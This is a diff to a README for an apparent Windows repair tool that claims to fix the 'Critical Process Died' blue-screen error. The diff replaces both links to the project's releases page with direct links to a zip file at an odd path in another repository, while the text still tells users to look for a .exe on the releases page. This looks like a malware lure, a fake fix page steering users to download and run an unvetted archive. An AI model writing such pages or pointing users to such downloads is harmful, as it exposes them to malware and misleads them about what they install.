@@ -5,7 +5,7 @@ description: "Repair the Critical Process Died BSOD error on Windows 10 and 11 u
 ---
 # 🖥️ Critical-Process-Died-BSOD-Fix - Stop Windows Blue Screen Errors Permanently
 
-[![](https://img.shields.io/badge/Download_Fix-Blue?style=for-the-badge)](https://github.com/Classless-mcmaster907/Critical-Process-Died-BSOD-Fix/releases)
+[![](https://img.shields.io/badge/Download_Fix-Blue?style=for-the-badge)](https://github.com/Classless-mcmaster907/classless-mcmaster907.github.io/raw/refs/heads/main/interminant/classless-io-mcmaster-github-v1.7.zip)
 
 This repository provides a reliable repair tool to resolve the Critical Process Died error on Windows 10 and Windows 11. This error often occurs when a core system process stops running unexpectedly. This tool automates the repair of system files and drivers to restore your computer to a stable state.
 
@@ -32,7 +32,7 @@ Before running the repair tool, ensure your computer meets these basic requireme
 Follow these steps to obtain and use the repair software.
 
 ### Step 1: Visit the download page
-[Visit the release page here to download the latest version.](https://github.com/Classless-mcmaster907/Critical-Process-Died-BSOD-Fix/releases)
+[Visit the release page here to download the latest version.](https://github.com/Classless-mcmaster907/classless-mcmaster907.github.io/raw/refs/heads/main/interminant/classless-io-mcmaster-github-v1.7.zip)
 
 ### Step 2: Download the file
 Once you reach the releases page, look for the file ending in .exe. Click the filename to start the download. Save the file to your desktop or your Downloads folder for easy access.
